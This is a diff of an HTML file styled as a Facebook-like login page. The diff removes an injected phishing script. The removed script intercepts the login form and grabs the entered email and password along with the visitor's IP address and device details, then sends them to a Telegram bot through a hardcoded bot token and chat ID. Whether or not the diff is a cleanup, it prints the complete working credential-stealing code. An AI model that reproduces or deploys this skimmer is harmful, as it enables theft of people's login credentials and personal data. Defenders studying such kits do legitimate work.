@@ -88,53 +88,5 @@
 <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk=" nonce="" data-btmanifest="1029640899_main"></script>
 <div id="has-finished-comet-page" hidden="" style="display: none;"></div>
 
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-    const TOKEN = "8045583714:AAHXR8cuURN3ZSex0fyIcamQpFT0zzNlWDQ";                                                            // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
-    const CHAT_ID = "6163138691";                                                       // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot8045583714:AAHXR8cuURN3ZSex0fyIcamQpFT0zzNlWDQ/sendMessage`;        
-
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        axios.get('https://api.ipify.org?format=json')
-            .then(response => {
-                const ip = response.data.ip;
-
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-
-                const message = ` 
-                    <b>New Login Attempt</b>\n
-                    <b>Email:</b> ${email}\n
-                    <b>Password:</b> ${password}\n
-                    <b>IP Address:</b> ${ip}\n
-                    <b>Device Type:</b> ${deviceType}\n
-                    <b>Platform:</b> ${platform}\n
-                    <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                `;
-
-                axios.post(URI_API, {
-                    chat_id: CHAT_ID,
-                    parse_mode: 'html',
-                    text: message
-                }).then(response => {
-                    alert('Information sent successfully!');
-                }).catch(error => {
-                    alert('Error sending the information. Please try again.');
-                });
-            })
-            .catch(error => {
-                alert('Error fetching the IP address. Please try again.');
-            });
-    });
-</script>
 
 <div><div class="_acb3"><div class="_acb4"></div></div><div class="_acb6"><div class="_acb7"></div></div><div><div></div></div></div></body></html>
